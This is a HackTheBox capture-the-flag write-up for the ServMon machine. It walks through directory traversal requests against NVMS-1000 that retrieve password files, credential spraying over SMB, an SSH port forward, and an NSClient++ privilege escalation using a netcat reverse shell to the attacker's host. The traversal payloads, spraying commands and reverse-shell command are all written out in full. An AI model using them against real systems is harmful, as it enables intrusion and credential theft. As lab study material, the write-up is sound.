# ServMon | HackTheBox

### 1. Scan
```bash
Nmap scan report for 10.129.103.173
Host is up, received echo-reply ttl 127 (0.27s latency).
Scanned at 2021-06-02 04:00:40 EDT for 2481s
Not shown: 65517 closed ports
Reason: 65517 resets
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnC92+BCplDo38VDQIZzb7V3HN/OucvxF0VMDDoYShdUrpDUW6JcSR/Zr6cADbHy7eDLw2O+WW+M4SzH7kfpbTv3HvJ0z8iOsRs2nUrUint4CR/A2vYA9SFOk18FU0QUS0sByBIlemU0uiPxN+iRCcpFhZDj+eiVRF7o/XxNbExnhU/2n9MXwFS8XTYNeGqSLE1vV6KdpMfpJj/yey8gvEpDQTX5OQK+kkUHze3LXLyu/XVTKzfqUBMAP+IQ5F6ICWgaC1a+cx/D7C/aobCbqaXY+75t1mxbEMmm1Wv/42nVQxcT7tN2C3sds4VJkYgZKcBhsE0XdJcR9mTb1wWsg9
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMToH2eB7rzpMZuvElpHYko/TXSsOfG8EXWQxmC/T4PCaAmVRDgJWEFMHgpRilSAKoOBlS2RHWNpMJldTFbWSVo=
|   256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILbqSRVLRJFVNhD0W0C5xB7b3RoJZZKdM+jSGryFWOQa
80/tcp    open  http          syn-ack ttl 127
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-favicon: Unknown favicon MD5: 3AEF8B29C4866F96A539730FAB53A88F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
5040/tcp  open  unknown       syn-ack ttl 127
5666/tcp  open  tcpwrapped    syn-ack ttl 127
6063/tcp  open  tcpwrapped    syn-ack ttl 127
6699/tcp  open  napster?      syn-ack ttl 127
8443/tcp  open  ssl/https-alt syn-ack ttl 127
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|_    Location: /index.html
| http-methods: 
|_  Supported Methods: GET
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-01-14T13:24:20
| Not valid after:  2021-01-13T13:24:20
| MD5:   1d03 0c40 5b7a 0f6d d8c8 78e3 cba7 38b4
| SHA-1: 7083 bd82 b4b0 f9c0 cc9c 5019 2f9f 9291 4694 8334
| -----BEGIN CERTIFICATE-----
| MIICoTCCAYmgAwIBAgIBADANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAlsb2Nh
| bGhvc3QwHhcNMjAwMTE0MTMyNDIwWhcNMjEwMTEzMTMyNDIwWjAUMRIwEAYDVQQD
| DAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDXCoMi
| kUUWbCi0E1C/LfZFrm4UKCheesOFUAITOnrCvfkYmUR0o7v9wQ8yR5sQR8OIxfJN
| vOTE3C/YZjPE/XLFrLhBpb64X83rqzFRwX7bHVr+PZmHQR0qFRvrsWoQTKcjrElo
| R4WgF4AWkR8vQqsCADPuDGIsNb6PyXSru8/A/HJSt5ef8a3dcOCszlm2bP62qsa8
| XqumPHAKKwiu8k8N94qyXyVwOxbh1nPcATwede5z/KkpKBtpNfSFjrL+sLceQC5S
| wU8u06kPwgzrqTM4L8hyLbsgGcByOBeWLjPJOuR0L/a33yTL3lLFDx/RwGIln5s7
| BwX8AJUEl+6lRs1JAgMBAAEwDQYJKoZIhvcNAQEFBQADggEBAAjXGVBKBNUUVJ51
| b2f08SxINbWy4iDxomygRhT/auRNIypAT2muZ2//KBtUiUxaHZguCwUUzB/1jiED
| s/IDA6dWvImHWnOZGgIUsLo/242RsNgKUYYz8sxGeDKceh6F9RvyG3Sr0OyUrPHt
| sc2hPkgZ0jgf4igc6/3KLCffK5o85bLOQ4hCmJqI74aNenTMNnojk42NfBln2cvU
| vK13uXz0wU1PDgfyGrq8DL8A89zsmdW6QzBElnNKpqNdSj+5trHe7nYYM5m0rrAb
| H2nO4PdFbPGJpwRlH0BOm0kIY0az67VfOakdo1HiWXq5ZbhkRm27B2zO7/ZKfVIz
| XXrt6LA=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.91%I=7%D=6/2%Time=60B74386%P=x86_64-pc-linux-gnu%r(NULL,
SF:6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\
SF:r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text
SF:/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x2
SF:0\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XH
SF:TML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DT
SF:D/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.o
SF:rg/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x
SF:20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20
SF:\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%
SF:r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html
SF:\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x
SF:201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xht
SF:ml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/19
SF:99/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x2
SF:0\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\
SF:x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RTS
SF:PRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nC
SF:ontent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\
SF:xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.
SF:0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-t
SF:ransitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xh
SF:tml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20
SF:<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x
SF:20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.91%T=SSL%I=7%D=6/2%Time=60B74390%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation:
SF:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0s\0d\0a\0y\0:\0T\0h\0u\0:\0T\0h\0u\0r\0s\0")%r(HTTPOptions
SF:,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x
SF:20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x
SF:2018\r\n\r\nDocument\x20not\x20found")%r(RTSPRequest,36,"HTTP/1\.1\x204
SF:04\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(SIPOpti
SF:ons,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20no
SF:t\x20found");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=6/2%OT=21%CT=1%CU=40411%PV=Y%DS=2%DC=T%G=Y%TM=60B74459
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)
OS:OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS%O
OS:6=M54DNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF
OS:=Y%T=80%W=FFFF%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%
OS:Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z
OS:%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%
OS:DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%
OS:O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=8
OS:0%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45723/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 27201/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 33578/udp): CLEAN (Timeout)
|   Check 4 (port 65237/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-02T08:41:27
|_  start_date: N/A

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   292.94 ms 10.10.14.1
2   292.94 ms 10.129.103.173

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun  2 04:42:01 2021 -- 1 IP address (1 host up) scanned in 2483.14 seconds
```
The machine is running SSH, FTP with anonymous access enabled, two HTTP servers on 80 and 8443 and SMB.

### 2. Check out FTP.
Use wget to mirror everything on FTP.
```bash
┌──(kali㉿kali)-[10.10.14.31]-[~/Desktop]
└─$ wget --user anonymous --password anonymous -r ftp://10.129.103.173                                       
--2021-06-02 04:50:34--  ftp://10.129.103.173/
           => ‘10.129.103.173/.listing’
Connecting to 10.129.103.173:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... done.    ==> LIST ... done.
...
Downloaded: 2 files, 360 in 0.005s (64.0 KB/s)
```
The FTP only contains 2 files: "Users/Nadine/Confidential.txt" and "Users/Nathan/Notes to do.txt".
```bash
┌──(kali㉿kali)-[10.10.14.31]-[~/Desktop/10.129.103.173]
└─$ cat Users/Nadine/Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine                                                                                                                                                                                      
┌──(kali㉿kali)-[10.10.14.31]-[~/Desktop/10.129.103.173]
└─$ cat Users/Nathan/Notes\ to\ do.txt 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

### 3. Check out the websites
Looking at both the web servers, one is hosting a NVMS-1000 web application which is used to control CCTV. The server on 8443 is hosting NSClient++. Looking at the lists above, see that the password for NVMS is changed from the default and that access for NSClient is locked down. Normal channels of enumeration such as dirbusting don't turn up much.  
  
When looking into NVMS-1000, see that there is a known directory traversal vulnerability that can be used to retrieve arbritary files from the server: https://github.com/AleDiBen/NVMS1000-Exploit.  
Reading the code, exploiting this issue isn't too difficult, as it is just a straightforward "../" * 50 and then the filename.

### 4. Retrieve the passwords
Tried a few premade tools, none of them seemed to work right, so just did the exploitation manually in Burpsuite. The location of the passwords file was already known, as Nadine said it was on Nathan's desktop.  
Request:
```
GET /../../../../../../../../../../../../../../users/nathan/desktop/passwords.txt HTTP/1.1
Host: 10.129.103.173
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: dataPort=6063
Upgrade-Insecure-Requests: 1
```
Response:
```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```
Also retrieve the NSClient++ password. Googled where to find the password file.  
Request:
```
GET /../../../../../../../../../../../../../../Program+Files\NSClient%2b%2b\nsclient.ini HTTP/1.1
Host: 10.129.103.173
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: dataPort=6063
Upgrade-Insecure-Requests: 1
```
Response:
```
HTTP/1.1 200 OK
Content-type: 
Content-Length: 2683
Connection: close
AuthInfo: 


# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help

; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1
...
```
Looks like the service is only allowed to be accessed locally. This will be useful later on.

### 5. Use the credentials
Firstly ran CME to see if this was the password for any of the users.
```bash
┌──(kali㉿kali)-[10.10.14.31]-[~/Desktop]
└─$ crackmapexec smb 10.129.103.173 -u users.txt -p passwords.txt
SMB         10.129.103.173  445    SERVMON          [*] Windows 10.0 Build 18362 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False)
SMB         10.129.103.173  445    SERVMON          [-] ServMon\Nathan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.129.103.173  445    SERVMON          [-] ServMon\Nathan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.129.103.173  445    SERVMON          [-] ServMon\Nathan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.129.103.173  445    SERVMON          [-] ServMon\Nathan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE 
SMB         10.129.103.173  445    SERVMON          [-] ServMon\Nathan:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE 
SMB         10.129.103.173  445    SERVMON          [-] ServMon\Nathan:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE 
SMB         10.129.103.173  445    SERVMON          [-] ServMon\Nathan:Gr4etN3w5w17hMySk1Pa5$ STATUS_LOGON_FAILURE 
SMB         10.129.103.173  445    SERVMON          [-] ServMon\Nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.129.103.173  445    SERVMON          [-] ServMon\Nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.129.103.173  445    SERVMON          [-] ServMon\Nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.129.103.173  445    SERVMON          [+] ServMon\Nadine:L1k3B1gBut7s@W0rk
```
Some valid credentials are now known: `Nadine:L1k3B1gBut7s@W0rk`. All the available shares are default.

### 6. Get a shell
Log in over SSH as Nadine.
```language
┌──(kali㉿kali)-[10.10.14.31]-[~/Desktop]
└─$ ssh Nadine@10.129.133.101
Nadine@10.129.133.101's password: 

Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine
```

### 7. Research exploit
While looking into NSClient++ it was noted there is a local privilege escalation exploit for the application.
From https://10.129.103.173:8443/index.html#/console:
  
*When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.  
The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.  
Prerequisites:  
To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.*
  
This exploit has been out a while, and has been adapted into an RCE exploit which doesn't need to reboot the system to succeed, instead it will just reload the service.

### 8. Get a shell
To exploit the application, an internal port forward is needed over SSH in order to access the NSClient++ application internally.
```ssh
┌──(kali㉿kali)-[10.10.14.31]-[~/Desktop]
└─$ ssh -L 127.0.0.1:9999:127.0.0.1:8443 Nadine@10.129.133.101
Nadine@10.129.133.101's password: 

Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>
```
Use the exploit at: https://www.exploit-db.com/exploits/48360. Note that the application takes a while to reload, so need to extend the wait time by about triple what it's currently hardcoded to, by changing the "count" variable in the script.
  
Need to copy netcat to the machine by starting an SMBserver from a folder hosting it.
```bash
┌──(kali㉿kali)-[10.10.14.31]-[~/Desktop/share]
└─$ sudo impacket-smbserver share $(pwd) -smb2support
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
Copy it across.
```shell
nadine@SERVMON c:\Temp>copy \\10.10.14.31\share\nc.exe .
        1 file(s) copied.
```
Start a listener and then run the script as follows:
```bash
┌──(kali㉿kali)-[10.10.14.31]-[~/Desktop/share]
└─$ ls
nc.exe

┌──(kali㉿kali)-[10.10.14.31]-[~/Desktop]
└─$ python3 exploit.py -t 127.0.0.1 -P 9999 -p ew2x6SsGTxjRwXOT -c "c:\temp\nc.exe 10.10.14.31 80 -e cmd.exe"
[!] Targeting base URL https://127.0.0.1:9999
[!] Obtaining Authentication Token . . .
[+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ
[!] Enabling External Scripts Module . . .
[!] Configuring Script with Specified Payload . . .
[+] Added External Script (name: UEtBeCgogGpMN)
[!] Saving Configuration . . .
[!] Reloading Application . . .
[!] Waiting for Application to reload . . .
[!] Obtaining Authentication Token . . .
[+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ
[!] Triggering payload, should execute shortly . . .
[!] Timeout exceeded. Assuming your payload executed . . .
```
Get a shell.
```bash
┌──(kali㉿kali)-[10.10.14.31]-[~/Desktop]
└─$ sudo nc -lvnp 80                  
listening on [any] 80 ...
connect to [10.10.14.31] from (UNKNOWN) [10.129.133.101] 49749
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system
```